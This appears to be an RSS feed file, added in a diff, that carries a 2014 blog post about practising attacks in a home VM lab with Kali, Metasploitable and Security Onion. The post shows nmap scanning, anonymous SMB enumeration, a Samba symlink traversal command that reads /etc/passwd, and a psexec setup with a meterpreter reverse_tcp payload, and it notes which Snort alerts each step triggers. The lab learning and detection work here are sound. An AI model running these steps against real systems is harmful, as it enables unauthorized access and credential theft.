@@ -1,0 +1,152 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Basics on The Subtlety</title>
+    <link>https://www.thesubtlety.com/tags/basics/</link>
+    <description>Recent content in Basics on The Subtlety</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 17 Feb 2014 20:58:31 +0000</lastBuildDate>
+    <atom:link href="https://www.thesubtlety.com/tags/basics/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Just the Basics</title>
+      <link>https://www.thesubtlety.com/post/just-the-basics/</link>
+      <pubDate>Mon, 17 Feb 2014 20:58:31 +0000</pubDate>
+      
+      <guid>https://www.thesubtlety.com/post/just-the-basics/</guid>
+      <description>&lt;p&gt;Things have been busy lately, but I&amp;rsquo;ve been doing some reading, learning, and playing around in a small VM lab, and thought to briefly document what I&amp;rsquo;ve done. There is unfortunately nothing groundbreaking here, and nothing too interesting beyond a demonstration.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;___  ___       _                      _         _  _   
+|  \/  |      | |                    | |       (_)| |  
+| .  . |  ___ | |_  __ _  ___  _ __  | |  ___   _ | |_ 
+| |\/| | / _ \| __|/ _` |/ __|| &#39;_ \ | | / _ \ | || __|
+| |  | ||  __/| |_| (_| |\__ \| |_) || || (_) || || |_ 
+\_|  |_/ \___| \__|\__,_||___/| .__/ |_| \___/ |_| \__|
+                              | |                      
+                              |_|
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For this example I&amp;rsquo;ve got Kali Linux, Metasploitable, Windows XP SP2, and Security Onion running. (Time to add some RAM&amp;hellip;) There are a ton of good reference resources out there, and most of this is simply plug and play. The Kali distro isn&amp;rsquo;t packaged with &lt;a href=&#34;http://www.tenable.com/products/nessus/select-your-operating-system&#34;&gt;Nessus&lt;/a&gt;, so that may need downloaded and installed, although certainly not required for our purposes. Nothing fancy here as all machines are on the same subnet and bridged via my host NIC, making traffic sniffing trivial and allowing us to see the (mostly Snort rule) results of this nefarious-ness.&lt;/p&gt;
+
+&lt;p&gt;The Metasploit Unleashed &lt;a href=&#34;http://www.offensive-security.com/metasploit-unleashed/&#34;&gt;guide&lt;/a&gt; makes for a handy reference tool for Metasploit and Meterpreter themselves as well as a jumping off point into further research; namely fuzzing, exploit design, and post-exploitation topics. Another handy reference was the second half of this Security Onion &lt;a href=&#34;https://code.google.com/p/security-onion/wiki/IntroductionWalkthrough&#34;&gt;walkthrough&lt;/a&gt;; the example with Sguil that was walked through was both interesting and instructive.&lt;/p&gt;
+
+&lt;p&gt;With all of the VMs up and running, msfconsole started in Kali, and with Security Onion listening to our traffic, let&amp;rsquo;s do a little host discover with nmap. Metasploit provides an easy way to automatically populate results into its database with the db_nmap command.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;db_nmap -Pn -sS -A 192.168.100.1/24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The results are automatically stored and are easily seen with via &amp;lsquo;hosts&amp;rsquo; and &amp;lsquo;services&amp;rsquo;. Exporting normal nmap results to an xml file can allow for easily importing into msf as well.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf&amp;gt; hosts
+Hosts
+======
+address         mac               name            os_name os_flavor os_sp purpose
+-------         ---               ----            ------- --------- ----- -------
+192.168.100.192 de:ad:be:ef:ca:fe 192.168.100.192 Linux   Debian          server
+
+msf&amp;gt; services 192.168.100.192
+Services
+========
+host              port  proto  name   state    info
+----              ----  -----  ----   -----    ----      
+192.168.100.192   21    tcp    ftp    open     ProFTPD 1.3.1
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nmap can be a fairly noisy tool as far as traffic generated though, as Sguil/Snorby results show. Snort alerts on fifty or so &amp;lsquo;potential scans&amp;rsquo; and the Nmap scripting engine has very recognizable traffic. If we run nmap without the -A agressive option, we reduce the amount of alerts considerably (from nearly 50 to about 7 or so events generated without the nmap scripts). &lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://www.thesubtlety.com/img/nmap_snorby.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Tip toeing around Snort rules and timers is an interesting game. Fyodor&amp;rsquo;s Nmap &lt;a href=&#34;http://nmap.org/book/&#34;&gt;book&lt;/a&gt; has quite a bit of information around this and makes for interesting reading. Another thing to note is the default User Agent for Nmap scripts is fairly conspicuous as seen below. According to &lt;a href=&#34;http://www.kroosec.com/2012/02/making-nmap-scripting-engine-stealthier.html&#34;&gt;this guy&lt;/a&gt;, that can be easily changed in the nse lua settings.&lt;/p&gt;
+
+&lt;p&gt;Another option for host and vulnerability discovery is via &lt;a href=&#34;https://en.wikipedia.org/wiki/Nessus_(software&#34;&gt;Nessus&lt;/a&gt;). Nmap and it&amp;rsquo;s version detection can get us a long way, but Nessus will give us a laundry list of poor configurations, out of date services, relevant CVEs, and fixes. The new HTML5 UI is quite nice to use; simply run a scan on your desired targets and export as as a nessus file (xml format) for Metasploit to import.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Anyways&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf&amp;gt; services 192.168.100.192
+Services
+========
+host              port  proto  name        state    info
+----              ----  -----  ----        -----    ----      
+192.168.100.192   21    tcp    ftp         open     ProFTPD 1.3.1
+192.168.100.192   137   udp    nebios-ns   open     
+192.168.100.192   139   tcp    netbios-ssn open     Samba smbd 3.x workgroup
+192.168.100.192   445   tcp    netbios-ssn open     Samba sbbd 3.x workgroup
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like Samba is running on Metasploitable. &lt;a href=&#34;https://www.grc.com/port_137.htm&#34;&gt;This&lt;/a&gt; page has some background info along with links to RFCs and other relevant netbios info.&lt;/p&gt;
+
+&lt;p&gt;In another terminal on Kali let&amp;rsquo;s see what shares are available with &amp;lsquo;smbclient -L //192.168.100.192&amp;rsquo;. Note this generates two low severity &amp;lsquo;GPL NETBIOS SMB unicode share access&amp;rsquo; Snort events. /tmp is available, with a cute &amp;lsquo;oh noes!&amp;rsquo; comment. Hmm, let&amp;rsquo;s try there first.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# smbclient -L //192.168.100.192
+Enter roots&#39;s password: &amp;lt;blank&amp;gt;
+Anonymous login successful
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+       Sharename         Type       Comment
+       ---------         ----       -------
+       opt               Disk       oh noes!
+...
+
+root@kali:~# smbclient //192.168.100.192/tmp
+Enter roots&#39;s password: &amp;lt;blank&amp;gt;
+Anonymous login successful
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+smb: \&amp;gt; ls
+  .
+  ..
+  .ICE-unix
+  .X11-unix
+  4608.jsvc_up
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we access this  share, we only see the /tmp directory and nothing more. But if the samba configuration allows &amp;lsquo;wide links&amp;rsquo; (which allow symbolic links to be added to a share) and allows write access to a directory, this is &amp;lsquo;exploitable&amp;rsquo; by linking the file system to a directory in /tmp. A decent explanation how this works is on &lt;a href=&#34;https://www.samba.org/samba/news/symlink_attack.html&#34;&gt;Samba.org&lt;/a&gt; and the &lt;a href=&#34;http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072944.html&#34;&gt;mailing list.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Manually, you simply connect via &lt;code&gt;smbclient //192.168.100.192/tmp&#39; anonymously, and enter &#39;symlink ../../../../../../../../../ rootfs&lt;/code&gt; which traverses back to root and links that to your newly created directory. This gives read access to /etc/passwd remotely. Fortunately, permissions are somewhat limited as the user is anonymous. Otherwise, Metasploit can take care of this for us with the Samba Link Traversal &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/samba_symlink_traversal.rb&#34;&gt;module&lt;/a&gt;.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://www.thesubtlety.com/img/Selection_002.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Once that has completed, open up a terminal, run &lt;code&gt;smbclient -L //192.168.100.192&lt;/code&gt;, enter &amp;lsquo;cd rootfs2`, and \etc\passwd is ours. &lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Other Stuff&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Even more fun can be had with the psexec module and a set of credentials. More info on &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx&#34;&gt;psexec&lt;/a&gt; and some more good information via &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified&#34;&gt;Rapid7&lt;/a&gt; for further reading.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use exploit/windows/smb/psexec
+...
+msf &amp;gt; set payload windows/meterpreter/reverse_tcp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Snort catches this with the high severity events&lt;strong&gt; &amp;rsquo;&lt;/strong&gt;ET SHELLCODE Possible call with a No Offset TCP Shellcode event&amp;rsquo; and an &amp;lsquo;ET POLICY PE EXE or DLL Windows file download&amp;rsquo;.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://www.thesubtlety.com/img/Selection_003.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This isn&amp;rsquo;t an exploit so to speak, but is an easy way to play around with Meterpreter. &lt;a href=&#34;http://www.offensive-security.com/metasploit-unleashed/About_Meterpreter&#34;&gt;Meterpreter&lt;/a&gt; exists only in memory, but does require a DLL sent to the victim, which as we saw, Snort detected. Meterpreter is an impressive tool; an in depth guide exists &lt;a href=&#34;http://dev.metasploit.com/documents/meterpreter.pdf&#34;&gt;here&lt;/a&gt; (pdf).&lt;/p&gt;
+
+&lt;p&gt;Next time I&amp;rsquo;ll try to post something a little more novel that what you&amp;rsquo;ve (maybe) just read. This all feels somewhat script-kiddyish without a solid understanding of exploit development, but a person&amp;rsquo;s got to start somewhere. There is virtually an unfathomable amount of knowledge and things to learn out there. Metasploitable in itself has a ton more to play with, not to mention Multillidae, DVWA, WebGoat, and others. I&amp;rsquo;d best get cracking.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
